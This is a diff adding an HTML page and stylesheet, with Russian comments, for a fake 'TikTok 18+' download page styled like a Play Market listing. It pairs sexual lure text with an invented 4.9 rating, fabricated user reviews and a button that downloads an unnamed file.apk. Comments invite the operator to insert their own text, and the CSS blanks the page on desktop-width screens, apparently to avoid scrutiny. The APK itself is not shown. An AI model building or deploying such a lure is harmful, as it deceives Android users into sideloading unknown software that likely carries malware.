@@ -1,0 +1,207 @@
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok 18+ Download</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<body>
+
+<div class="card">
+    <img src="app.png" class="icon" alt="App icon">
+
+    <h1>TikTok 18+</h1>
+
+    <div class="rating">
+        ⭐️⭐️⭐️⭐️⭐️
+        <span>4.9 (128 000)</span>
+    </div>
+
+    <!-- ОБЗОР / СКРИНШОТЫ -->
+    <div class="screens">
+        <img src="img/screen1.jpg" alt="screen 1">
+        <img src="img/screen2.jpg" alt="screen 2">
+        <img src="img/screen3.jpg" alt="screen 3">
+    </div>
+
+    <!-- ОПИСАНИЕ (ВСТАВЬ СВОЙ ТЕКСТ) -->
+    <p class="desc">
+        <!-- ЗАМЕНИ ЭТОТ ТЕКСТ НА СВОЁ ОПИСАНИЕ -->
+        ikTok 18+ — только для взрослых. Добро пожаловать в мир, где нет цензуры! 🔥 Только здесь — самые горячие видео, дерзкие тренды и откровенные моменты, которые не покажут в обычных соцсетях. Наслаждайся контентом от смелых девушек, заводных танцев и приватных фрагментов, скрытых от чужих глаз.
+Только для тех, кто старше 18 💃 Максимум свободы 📱 Приватный доступ 💥 Никаких ограничений. Смотри, комментируй и будь частью эксклюзивного сообщества, где удовольствие начинается с одного свайпа.
+Последнее обновление
+22/02/2025.
+    </p>
+
+    <button id="downloadBtn" class="btn">Скачать</button>
+
+    <p class="small">Размер: 2 MB • Android</p>
+
+    <!-- ОТЗЫВЫ -->
+    <div class="reviews">
+        <h2>Отзывы</h2>
+
+        <div class="review">
+            <img src="img/avatar1.png" class="avatar">
+            <div class="review-body">
+                <div class="review-head">
+                    <strong>Muhammadali Bahi</strong>
+                    <span class="menu">⋮</span>
+                </div>
+                <div class="stars">★★★★★</div>
+                <div class="date">05/01/2025</div>
+                <p>Это точно не обычный ТикТок… я в шоке 😳</p>
+                <div class="help">Была ли эта информация полезна для вас? <span>Да</span> <span>Нет</span></div>
+            </div>
+        </div>
+
+        <div class="review">
+            <img src="img/avatar2.png" class="avatar">
+            <div class="review-body">
+                <div class="review-head">
+                    <strong>Abdulloh UZ</strong>
+                    <span class="menu">⋮</span>
+                </div>
+                <div class="stars">★★★★★</div>
+                <div class="date">01/01/2025</div>
+                <p>Девочки тут просто ОГОНЬ 🔥 кто их находит вообще?</p>
+                <div class="help">Была ли эта информация полезна для вас? <span>Да</span> <span>Нет</span></div>
+            </div>
+        </div>
+
+        <div class="review">
+            <img src="img/avatar3.png" class="avatar">
+            <div class="review-body">
+                <div class="review-head">
+                    <strong>Yasmina_2000</strong>
+                    <span class="menu">⋮</span>
+                </div>
+                <div class="stars">★★★★★</div>
+                <div class="date">17/12/2024</div>
+                <p>Когда думал, что зашёл просто на ТикТок, а остался на всю ночь… 😅</p>
+                <div class="help">Была ли эта информация полезна для вас? <span>Да</span> <span>Нет</span></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.getElementById('downloadBtn').onclick = function() {
+    const link = document.createElement('a');
+    link.href = 'files/file.apk';
+    link.download = 'file.apk';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+};
+</script>
+
+</body>
+</html>
+```
+
+---
+
+## style.css
+
+```css
+body {
+    margin: 0;
+    background: #0b1220;
+    font-family: Arial, sans-serif;
+    color: white;
+    max-width: 420px;      /* ФИКС: только мобильный экран */
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.card {
+    max-width: 360px;
+    margin: auto;
+    padding: 16px 12px 24px; /* мобильные отступы */
+}
+
+.icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 24px;
+    display: block;
+    margin: 0 auto 12px;
+}
+
+h1 { text-align:center; margin:10px 0; font-size:20px; }
+
+.rating { text-align:center; color:#facc15; font-size:14px; }
+.rating span { color:#cbd5e1; font-size:13px; }
+
+.screens {
+    display: flex;
+    gap: 10px;
+    overflow-x: auto;
+    margin: 16px 0 12px;
+}
+
+.screens img {
+    width: 95px;           /* размер как в Play Market */
+    border-radius: 12px;
+}
+
+.desc {
+    margin: 14px 0 18px;
+    font-size: 14px;
+    line-height: 1.45;
+    color: #e5e7eb;
+}
+
+.btn {
+    width: 100%;
+    background: #22c55e;
+    color: black;
+    padding: 13px;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: bold;
+    border: none;
+    cursor: pointer;
+}
+
+.small { text-align:center; margin-top:12px; color:#9ca3af; font-size:11px; }
+
+.reviews { margin-top: 22px; }
+.reviews h2 { font-size: 16px; margin-bottom: 12px; }
+
+.review {
+    display: flex;
+    gap: 10px;
+    background: #111827;
+    padding: 10px;
+    border-radius: 14px;
+    margin-bottom: 10px;
+}
+
+.avatar {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+}
+
+.review-head {
+    display: flex;
+    justify-content: space-between;
+    font-size: 13px;
+}
+
+.menu { color:#9ca3af; }
+.stars { color:#facc15; font-size:13px; }
+.date { font-size:11px; color:#9ca3af; }
+.help { font-size:11px; color:#9ca3af; }
+.help span { margin-left:8px; }
+
+/* НА ПК СКРЫВАЕМ (только Android) */
+@media screen and (min-width: 481px) {
+    body { display: none; }
+}
+```
